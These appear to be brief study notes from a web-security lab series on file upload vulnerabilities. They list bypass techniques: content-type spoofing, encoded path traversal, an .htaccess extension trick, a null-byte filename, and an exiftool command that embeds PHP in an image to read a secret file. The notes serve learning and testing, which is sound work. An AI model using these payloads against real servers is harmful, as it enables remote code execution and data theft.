# Remote code execution
- Just upload the file

# Via content-type restriction bypass
- Just change content to allowed content when uploading

# Via path traversal
- In the filename, you could use path traversal
  - however since the respone to ../ was still avatars/file, we needed to find an encoding that would not get stripped
  - `..%2f` worked and got `avatars/../file`
- Open the image in the new tab and remove `"avatars..%2f"` from the url

# Via extension blacklist
- Use t.htaccess (make sure you change it to .htaccess)
- Change the file extension from php to hun

# Via obfuscated filename
- This filename worked: `gec.php%00.jpg`

# Polygot
- Used this exiftool cmd to create the file: `exiftool -comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" gandalf.jpg -o pol_gfc.php`
- The secret should be near the top of the file between start and end
